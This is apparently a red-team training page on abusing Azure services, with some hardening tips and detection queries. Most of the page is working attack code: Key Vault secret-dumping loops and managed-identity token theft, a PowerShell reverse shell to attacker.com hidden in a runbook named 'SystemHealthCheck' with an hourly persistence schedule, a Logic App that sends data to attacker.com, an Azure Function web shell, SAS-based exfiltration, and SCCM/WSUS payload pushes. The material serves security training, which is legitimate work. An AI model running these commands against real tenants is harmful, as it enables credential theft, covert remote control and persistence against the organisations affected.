---
layout: training-page
title: "Abusing Azure Services — Red Team Academy"
module: "Active Directory"
tags:
  - azure-ad
  - key-vault
  - automation-accounts
  - logic-apps
  - azure-functions
  - storage-accounts
  - managed-identity
page_key: "ad-azure-services-abuse"
render_with_liquid: false
---

# Abusing Azure Services

Azure services — Key Vaults, Automation Accounts, Logic Apps, Azure Functions, and Storage Accounts — frequently hold sensitive data, credentials, and execution contexts. Misconfigurations in access policies, managed identities, and network exposure create high-impact lateral movement and privilege escalation vectors.

## Azure Key Vault Attacks

Key Vaults store secrets (API keys, connection strings), certificates, and encryption keys. Over-permissive access policies and public network exposure are the most common misconfigurations.

### Discovery and Enumeration

```bash
# List all Key Vaults in the subscription
az keyvault list --query "[].{name:name, resourceGroup:resourceGroup, uri:properties.vaultUri}" -o table

# Check access policies (who has what permissions)
az keyvault show --name "<vault-name>" \
    --query "properties.accessPolicies[].{user:objectId, permissions:permissions}"

# Check if the vault is publicly accessible (no network restrictions)
az keyvault show --name "<vault-name>" \
    --query "properties.networkAcls"
```

### Secret Extraction

```bash
# List all secrets in the vault
az keyvault secret list --vault-name "<vault-name>" \
    --query "[].{name:name, enabled:attributes.enabled}"

# Read a specific secret value
az keyvault secret show \
    --vault-name "<vault-name>" \
    --name "<secret-name>" \
    --query "value"

# Download all secrets (loop)
for secret in $(az keyvault secret list --vault-name "<vault-name>" --query "[].name" -o tsv); do
    value=$(az keyvault secret show --vault-name "<vault-name>" --name "$secret" --query "value" -o tsv)
    echo "$secret: $value"
done
```

### Certificate and Key Extraction

```bash
# List certificates in vault
az keyvault certificate list --vault-name "<vault-name>"

# Download certificate (public portion)
az keyvault certificate download \
    --vault-name "<vault-name>" \
    --name "<cert-name>" \
    --file cert.pem

# Download certificate with private key (if Key permissions include Download)
az keyvault secret show \
    --vault-name "<vault-name>" \
    --name "<cert-name>" | jq -r '.value' | base64 -d > cert.pfx

# Decrypt data using a vault key (if Key permissions include Decrypt)
az keyvault key decrypt \
    --name "<key-name>" \
    --vault-name "<vault-name>" \
    --algorithm RSA-OAEP \
    --value "<base64-ciphertext>"
```

### Graph API Key Vault Access (Without az CLI)

```bash
# Get ARM token
TOKEN=$(curl -H "Metadata:true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" \
    | jq -r '.access_token')

# Access vault secrets via REST API
curl -H "Authorization: Bearer $TOKEN" \
     "https://<vault-name>.vault.azure.net/secrets?api-version=7.3"

curl -H "Authorization: Bearer $TOKEN" \
     "https://<vault-name>.vault.azure.net/secrets/<secret-name>?api-version=7.3"
```

### Hardening

- Enable **private endpoint** — remove public network access
- Use **RBAC** model instead of legacy access policies
- Enable **soft-delete** and **purge protection** — prevents secret destruction
- Enable **Azure Defender for Key Vault** — alerts on unusual access patterns
- Require **Managed Identity** authentication — avoid service principal secrets stored elsewhere

---

## Azure Automation Accounts

Automation Accounts run Runbooks (PowerShell/Python) with optionally assigned Managed Identities. They can interact with virtually any Azure or on-prem resource.

### Enumerating Automation Accounts

```bash
# List all Automation Accounts
az automation account list \
    --query "[].{name:name, resourceGroup:resourceGroup, location:location}"

# Check if Managed Identity is assigned
az automation account show --name "<acct-name>" --resource-group "<rg>" \
    --query "identity"

# List existing Runbooks
az automation runbook list --automation-account-name "<acct-name>" --resource-group "<rg>" \
    --query "[].{name:name, type:runbookType, state:state}"
```

### Malicious Runbook Injection

```powershell
# Create a malicious PowerShell Runbook
$runbookContent = @'
$client = New-Object System.Net.Sockets.TCPClient("attacker.com", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback + "PS> ")
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
'@

# Upload the Runbook
az automation runbook create \
    --automation-account-name "<acct-name>" \
    --resource-group "<rg>" \
    --name "SystemHealthCheck" \
    --type "PowerShell" \
    --content "$runbookContent"

# Publish and execute
az automation runbook publish \
    --automation-account-name "<acct-name>" \
    --resource-group "<rg>" \
    --name "SystemHealthCheck"

az automation runbook start \
    --automation-account-name "<acct-name>" \
    --resource-group "<rg>" \
    --name "SystemHealthCheck"
```

### Abusing Managed Identity via Runbook

If the Automation Account's MSI has privileged RBAC:

```powershell
# Inside a Runbook — use MSI to access Key Vault secrets
$response = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/' `
    -Method GET -Headers @{Metadata="true"}
$token = ($response.Content | ConvertFrom-Json).access_token

# Use token to access vault
$secretResponse = Invoke-WebRequest `
    -Uri "https://<vault-name>.vault.azure.net/secrets/<secret-name>?api-version=7.3" `
    -Headers @{Authorization="Bearer $token"}
($secretResponse.Content | ConvertFrom-Json).value
```

### Persistent Scheduled Runbook (Backdoor)

```bash
# Create a schedule for the malicious Runbook (runs every hour)
az automation schedule create \
    --automation-account-name "<acct-name>" \
    --resource-group "<rg>" \
    --name "HourlyMaintenance" \
    --frequency Hour \
    --interval 1 \
    --start-time "2026-04-06T00:00:00Z"

# Link Runbook to schedule
az automation runbook-schedule link \
    --automation-account-name "<acct-name>" \
    --resource-group "<rg>" \
    --runbook-name "SystemHealthCheck" \
    --schedule-name "HourlyMaintenance"
```

---

## Azure Logic Apps and Functions

Logic Apps and Functions can be weaponized for code execution, data exfiltration, and persistence with low detection.

### Abusing Logic Apps

```json
{
  "definition": {
    "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
    "triggers": {
      "manual": {
        "type": "Request",
        "kind": "Http",
        "inputs": {
          "schema": {}
        }
      }
    },
    "actions": {
      "Exfiltrate_Data": {
        "type": "Http",
        "inputs": {
          "method": "POST",
          "uri": "https://attacker.com/data",
          "headers": {
            "Content-Type": "application/json"
          },
          "body": "@triggerBody()"
        }
      }
    }
  }
}
```

```bash
# Deploy malicious Logic App
az logic workflow create \
    --resource-group "<rg>" \
    --name "AzureMonitorAlerts" \
    --definition @malicious_workflow.json \
    --location "eastus"

# Get the trigger URL (HTTP endpoint for the C2)
az logic workflow trigger list-callback-url \
    --resource-group "<rg>" \
    --workflow-name "AzureMonitorAlerts" \
    --trigger-name "manual"
```

### Abusing Azure Functions for Code Execution

```bash
# List all Function Apps
az functionapp list --query "[].{name:name, resourceGroup:resourceGroup, state:state}"

# Upload a malicious PowerShell function via zip deploy
# Create malicious function code in run.ps1:
cat > run.ps1 << 'EOF'
using namespace System.Net
param($Request, $TriggerMetadata)

$cmd = $Request.Query.cmd
if ($cmd) {
    $output = Invoke-Expression $cmd 2>&1
    Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
        StatusCode = [HttpStatusCode]::OK
        Body = $output
    })
}
EOF

# Deploy via Kudu API or az webapp
az functionapp deployment source config-zip \
    --resource-group "<rg>" \
    --name "<function-app-name>" \
    --src function.zip
```

---

## Azure Storage Account Attacks

Storage accounts contain blob data, file shares, queues, and tables — frequently holding backups, logs, deployment scripts, and sensitive configuration files.

### Enumeration

```bash
# List all storage accounts
az storage account list \
    --query "[].{name:name, resourceGroup:resourceGroup, kind:kind, accessTier:accessTier}"

# Check public blob container access (anonymous access)
az storage account show --name "<account-name>" \
    --query "allowBlobPublicAccess"

# List containers in a storage account (requires key or token)
az storage container list \
    --account-name "<account-name>" \
    --auth-mode login

# List blobs in a container
az storage blob list \
    --container-name "<container-name>" \
    --account-name "<account-name>" \
    --auth-mode login \
    --query "[].{name:name, size:properties.contentLength}"
```

### Extracting Storage Account Keys

```bash
# List storage account access keys (requires Storage Account Contributor or Owner)
az storage account keys list \
    --account-name "<account-name>" \
    --resource-group "<rg>"

# Use the key to access all storage in the account
az storage blob download \
    --account-name "<account-name>" \
    --account-key "<key1>" \
    --container-name "<container>" \
    --name "<blob-name>" \
    --file downloaded_blob.txt
```

### SAS Token Generation (For Exfiltration)

```bash
# Generate a SAS token for a container (valid for 7 days)
az storage container generate-sas \
    --account-name "<account-name>" \
    --account-key "<key>" \
    --name "<container-name>" \
    --permissions rwdlacup \
    --expiry "2026-04-13T00:00:00Z"

# Use SAS token to access storage from any location
azcopy copy "<local-path>" \
    "https://<account-name>.blob.core.windows.net/<container>/<SAS-token>"
```

### Publicly Exposed Blobs

```bash
# Check if any containers have public access enabled
az storage container list \
    --account-name "<account-name>" \
    --auth-mode login \
    --query "[].{name:name, publicAccess:properties.publicAccess}"

# Access a public blob directly (no auth required)
curl "https://<account-name>.blob.core.windows.net/<container>/<blob-name>"

# Google dork to find exposed Azure storage
# site:blob.core.windows.net filetype:json
```

---

## App Services and Managed Identity Abuse

Azure App Services (web apps) with Managed Identities can access cloud resources on behalf of the application.

```bash
# From inside an App Service — access MSI token endpoint
curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
     "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/"

# Or via IMDS (VMs and Container Instances)
curl -H "Metadata: true" \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"

# Check what RBAC roles the MSI has
az role assignment list --assignee "<msi-object-id>"
```

---

## WSUS and SCCM Compromise Paths

In enterprise environments, WSUS and SCCM/MECM can be abused for lateral movement and code execution across managed clients.

```powershell
# SharpSCCM — enumerate SCCM environment
.\SharpSCCM.exe local site-info
.\SharpSCCM.exe get users
.\SharpSCCM.exe get computers

# Deploy malicious package to all SCCM clients
.\SharpSCCM.exe exec -d <device> -r <payload-path>

# WSUS poisoning — if you control or can MitM the WSUS server
# Inject malicious update targeting specific machines
# Tool: pywsus
python3 pywsus.py -H 0.0.0.0 -p 8530 -e ./fake_update.exe
```

---

## Detection

```
// Key Vault: Alert on secret access
AzureDiagnostics
| where ResourceType == "VAULTS"
| where OperationName == "SecretGet"
| where ResultType == "Success"
| project TimeGenerated, CallerIPAddress, Resource, requestUri_s

// Automation Account: New Runbook creation
AzureActivity
| where ResourceProviderValue == "MICROSOFT.AUTOMATION"
| where OperationNameValue == "microsoft.automation/automationaccounts/runbooks/write"
| project TimeGenerated, Caller, Resource

// Logic Apps: External HTTP calls
AzureActivity
| where ResourceProviderValue == "MICROSOFT.LOGIC"
| where OperationNameValue contains "workflows/write"

// Storage: Public container enabled
AzureActivity
| where ResourceProviderValue == "MICROSOFT.STORAGE"
| where Properties contains "publicAccess"
| project TimeGenerated, Caller, Resource, Properties

// MSI token access anomaly
AzureDiagnostics
| where ResourceType == "VAULTS"
| where CallerIPAddress !in (known_ip_list)
| where identity_claim_oid_g != ""
| summarize count() by CallerIPAddress, identity_claim_oid_g
```

## Resources

- Azure Key Vault documentation — `learn.microsoft.com/en-us/azure/key-vault/`
- Azure Automation security baseline — `learn.microsoft.com/en-us/security/benchmark/azure/baselines/automation-security-baseline`
- Azure Storage security guide — `learn.microsoft.com/en-us/azure/storage/blobs/security-recommendations`
- SharpSCCM — `github.com/Mayyhem/SharpSCCM`
- pywsus — `github.com/GoSecure/pywsus`
- Microsoft Defender for Cloud — `learn.microsoft.com/en-us/azure/defender-for-cloud/`
